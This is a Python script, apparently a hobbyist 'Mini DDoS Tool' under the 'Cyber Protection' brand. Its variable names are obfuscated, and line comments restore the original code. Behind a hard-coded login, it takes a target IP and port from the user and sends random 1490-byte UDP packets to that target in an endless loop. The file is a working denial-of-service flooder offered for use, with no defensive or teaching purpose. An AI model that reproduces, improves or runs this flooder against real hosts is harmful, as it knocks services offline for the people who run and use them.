import os #line:1:import os
import time #line:2:import time
import socket #line:3:import socket
import random #line:4:import random
def print_logo ():#line:7:def print_logo():
    os .system ("clear")#line:8:os.system("clear")
    print ("\033[92m")#line:9:print("\033[92m")
    print ("   ╔══════════════════════════════════════════════════════════════╗")#line:10:print("   ╔══════════════════════════════════════════════════════════════╗")
    print ("   ║                   CYBER PROTECTION TOOL                      ║")#line:11:print("   ║                   CYBER PROTECTION TOOL                      ║")
    print ("   ╚══════════════════════════════════════════════════════════════╝")#line:12:print("   ╚══════════════════════════════════════════════════════════════╝")
    print ("\n")#line:13:print("\n")
    print ("   _____      _                 _____           _            _   _              ")#line:14:print("   _____      _                 _____           _            _   _              ")
    print ("  / ____|    | |               |  __ \\         | |          | | (_)             ")#line:15:print("  / ____|    | |               |  __ \\         | |          | | (_)             ")
    print (" | |    _   _| |__   ___ _ __  | |__) | __ ___ | |_ ___  ___| |_ _  ___  _ __   ")#line:16:print(" | |    _   _| |__   ___ _ __  | |__) | __ ___ | |_ ___  ___| |_ _  ___  _ __   ")
    print (" | |   | | | | '_ \\ / _ \\ '__| |  ___/ '__/ _ \\| __/ _ \\/ __| __| |/ _ \\| '_ \\  ")#line:17:print(" | |   | | | | '_ \\ / _ \\ '__| |  ___/ '__/ _ \\| __/ _ \\/ __| __| |/ _ \\| '_ \\  ")
    print (" | |___| |_| | |_) |  __/ |    | |   | | | (_) | ||  __/ (__| |_| | (_) | | | | ")#line:18:print(" | |___| |_| | |_) |  __/ |    | |   | | | (_) | ||  __/ (__| |_| | (_) | | | | ")
    print ("  \\_____\\__, |_.__/ \\___|_|    |_|   |_|  \\___/ \\__\\___|\\___|\\__|_|\\___/|_| |_| ")#line:19:print("  \\_____\\__, |_.__/ \\___|_|    |_|   |_|  \\___/ \\__\\___|\\___|\\__|_|\\___/|_| |_| ")
    print ("         __/ |                                                                 ")#line:20:print("         __/ |                                                                 ")
    print ("        |___/                                                                 ")#line:21:print("        |___/                                                                 ")
    print ("\033[94m")#line:22:print("\033[94m")
    print ("   ╔══════════════════════════════════════════════════════════════════════╗")#line:23:print("   ╔══════════════════════════════════════════════════════════════════════╗")
    print ("   ║                    DEVELOPER INFORMATION                             ║")#line:24:print("   ║                    DEVELOPER INFORMATION                             ║")
    print ("   ╠══════════════════════════════════════════════════════════════════════╣")#line:25:print("   ╠══════════════════════════════════════════════════════════════════════╣")
    print ("   ║  👤 Coded By  : MD Mehadi Hasan (Shuvo)                              ║")#line:26:print("   ║  👤 Coded By  : MD Mehadi Hasan (Shuvo)                              ║")
    print ("   ║  🖊️ Author     : Cyber Protection                                     ║")#line:27:print("   ║  🖊️ Author     : Cyber Protection                                     ║")
    print ("   ║  🔗 Facebook  : https://www.facebook.com/mdmehadihasanofficial       ║")#line:28:print("   ║  🔗 Facebook  : https://www.facebook.com/mdmehadihasanofficial       ║")
    print ("   ║  📘 Team  Page: https://www.facebook.com/CyberProtectionBdcp         ║")#line:29:print("   ║  📘 Team  Page: https://www.facebook.com/CyberProtectionBdcp         ║")
    print ("   ║  🏛️ Team  Group: https://facebook.com/groups/cyberprotectionofficial/ ║")#line:30:print("   ║  🏛️ Team  Group: https://facebook.com/groups/cyberprotectionofficial/ ║")
    print ("   ╠══════════════════════════════════════════════════════════════════════╣")#line:31:print("   ╠══════════════════════════════════════════════════════════════════════╣")
    print ("   ║  🔥 Tool Version: 1.3.25                                             ║")#line:32:print("   ║  🔥 Tool Version: 1.3.25                                             ║")
    print ("   ╚══════════════════════════════════════════════════════════════════════╝")#line:33:print("   ╚══════════════════════════════════════════════════════════════════════╝")
    print ("\n")#line:34:print("\n")
def login ():#line:37:def login():
    print ("\033[92m")#line:38:print("\033[92m")
    print ("   ╔════════════════════════════╗")#line:39:print("   ╔════════════════════════════╗")
    print ("   ║      LOGIN TO CONTINUE     ║")#line:40:print("   ║      LOGIN TO CONTINUE     ║")
    print ("   ╚════════════════════════════╝")#line:41:print("   ╚════════════════════════════╝")
    O0O0OO0000OO00O00 =0 #line:43:attempts = 0
    while O0O0OO0000OO00O00 <3 :#line:44:while attempts < 3:
        O0000000OOO000O00 =input ("\n   ➤ Enter Username: ")#line:45:username = input("\n   ➤ Enter Username: ")
        OO00OO00OO0OOO00O =input ("   ➤ Enter Password: ")#line:46:password = input("   ➤ Enter Password: ")
        if O0000000OOO000O00 =="cyber_protection"and OO00OO00OO0OOO00O =="mehadi0011":#line:48:if username == "cyber_protection" and password == "mehadi0011":
            print ("\n   ✅ Login Successful!\n")#line:49:print("\n   ✅ Login Successful!\n")
            time .sleep (1 )#line:50:time.sleep(1)
            os .system ("clear")#line:51:os.system("clear")
            return True #line:52:return True
        else :#line:53:else:
            O0O0OO0000OO00O00 +=1 #line:54:attempts += 1
            print (f"\n   ❌ Invalid Credentials! Attempts Left: {3 - O0O0OO0000OO00O00}\n")#line:55:print(f"\n   ❌ Invalid Credentials! Attempts Left: {3 - attempts}\n")
    print ("\n   ❌ Access Denied! Exiting...\n")#line:57:print("\n   ❌ Access Denied! Exiting...\n")
    exit ()#line:58:exit()
def loading_bar ():#line:61:def loading_bar():
    print ("\033[91m")#line:62:print("\033[91m")
    for O00O00O0OOO00OOOO in range (101 ):#line:63:for i in range(101):
        time .sleep (0.01 )#line:64:time.sleep(0.01)  # Faster loading
        print (f"\r   ➤ Loading: [{'#' * (O00O00O0OOO00OOOO//5)}{' ' * (20 - (O00O00O0OOO00OOOO//5))}] {O00O00O0OOO00OOOO}%",end ='',flush =True )#line:65:print(f"\r   ➤ Loading: [{'#' * (i//5)}{' ' * (20 - (i//5))}] {i}%", end='', flush=True)
    print ("\n\n")#line:66:print("\n\n")
def get_target_details ():#line:69:def get_target_details():
    print ("\033[93m")#line:70:print("\033[93m")
    print ("   ╔══════════════════════════════════════════╗")#line:71:print("   ╔══════════════════════════════════════════╗")
    print ("   ║          ENTER TARGET DETAILS            ║")#line:72:print("   ║          ENTER TARGET DETAILS            ║")
    print ("   ╚══════════════════════════════════════════╝")#line:73:print("   ╚══════════════════════════════════════════╝")
    O0OOOOOO0OO0OOOOO =input ("\n   ➤ Enter Target Website URL: ")#line:75:url = input("\n   ➤ Enter Target Website URL: ")
    OO00OOOOO0O0O000O =input ("   ➤ Enter Target IP Address: ")#line:76:ip = input("   ➤ Enter Target IP Address: ")
    OO000OO00O0O00000 =int (input ("   ➤ Enter Target Port Number: "))#line:77:port = int(input("   ➤ Enter Target Port Number: "))
    print ("\n   ✅ Details received successfully.\n")#line:79:print("\n   ✅ Details received successfully.\n")
    return O0OOOOOO0OO0OOOOO ,OO00OOOOO0O0O000O ,OO000OO00O0O00000 #line:80:return url, ip, port
def print_ddos_banner ():#line:83:def print_ddos_banner():
    print ("\033[96m")#line:84:print("\033[96m")
    print ("   ╔══════════════════════════════════════════╗")#line:85:print("   ╔══════════════════════════════════════════╗")
    print ("   ║               MINI DDOS TOOL             ║")#line:86:print("   ║               MINI DDOS TOOL             ║")
    print ("   ╚══════════════════════════════════════════╝")#line:87:print("   ╚══════════════════════════════════════════╝")
    print ("\n")#line:88:print("\n")
    print ("███╗   ███╗██╗███╗   ██╗██╗    ██████╗ ██████╗  ██████╗ ███████╗")#line:89:print("███╗   ███╗██╗███╗   ██╗██╗    ██████╗ ██████╗  ██████╗ ███████╗")
    print ("████╗ ████║██║████╗  ██║██║    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝")#line:90:print("████╗ ████║██║████╗  ██║██║    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝")
    print ("██╔████╔██║██║██╔██╗ ██║██║    ██║  ██║██║  ██║██║   ██║███████╗")#line:91:print("██╔████╔██║██║██╔██╗ ██║██║    ██║  ██║██║  ██║██║   ██║███████╗")
    print ("██║╚██╔╝██║██║██║╚██╗██║██║    ██║  ██║██║  ██║██║   ██║╚════██║")#line:92:print("██║╚██╔╝██║██║██║╚██╗██║██║    ██║  ██║██║  ██║██║   ██║╚════██║")
    print ("██║ ╚═╝ ██║██║██║ ╚████║██║    ██████╔╝██████╔╝╚██████╔╝███████║")#line:93:print("██║ ╚═╝ ██║██║██║ ╚████║██║    ██████╔╝██████╔╝╚██████╔╝███████║")
    print ("╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝")#line:94:print("╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝")
def start_ddos (O0O00OO00OOO0O0OO ,OOO00O0OO0O000O00 ):#line:97:def start_ddos(ip, port):
    O00O0000OOO000000 =socket .socket (socket .AF_INET ,socket .SOCK_DGRAM )#line:98:sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    O00OO0O0000OO00O0 =random ._urandom (1490 )#line:99:bytes = random._urandom(1490)
    OO00OOO0000O0OO00 =0 #line:100:packet_count = 0
    print (f"\n   🚀 DDoS Attack started on {O0O00OO00OOO0O0OO} through port {OOO00O0OO0O000O00}")#line:102:print(f"\n   🚀 DDoS Attack started on {ip} through port {port}")
    while True :#line:104:while True:
        O00O0000OOO000000 .sendto (O00OO0O0000OO00O0 ,(O0O00OO00OOO0O0OO ,OOO00O0OO0O000O00 ))#line:105:sock.sendto(bytes, (ip, port))
        OO00OOO0000O0OO00 +=1 #line:106:packet_count += 1
        print (f"\033[35m   ➤ Sent packet #{OO00OOO0000O0OO00} to {O0O00OO00OOO0O0OO} on port {OOO00O0OO0O000O00}")#line:107:print(f"\033[35m   ➤ Sent packet #{packet_count} to {ip} on port {port}")  # Added purple color
def main ():#line:110:def main():
    print_logo ()#line:111:print_logo()
    if login ():#line:114:if login():
        print_ddos_banner ()#line:116:print_ddos_banner()
        loading_bar ()#line:119:loading_bar()
        O0OO0OOO0000O0000 ,O0OO000000O0000O0 ,OO0O0O0OO0O0OO0OO =get_target_details ()#line:122:url, ip, port = get_target_details()
        start_ddos (O0OO000000O0000O0 ,OO0O0O0OO0O0OO0OO )#line:125:start_ddos(ip, port)
    else :#line:126:else:
        print ("\033[91m   ❌ Access Denied! Please try logging in again.")#line:127:print("\033[91m   ❌ Access Denied! Please try logging in again.")
if __name__ =="__main__":#line:129:if __name__ == "__main__":
    main ()#line:130:main()
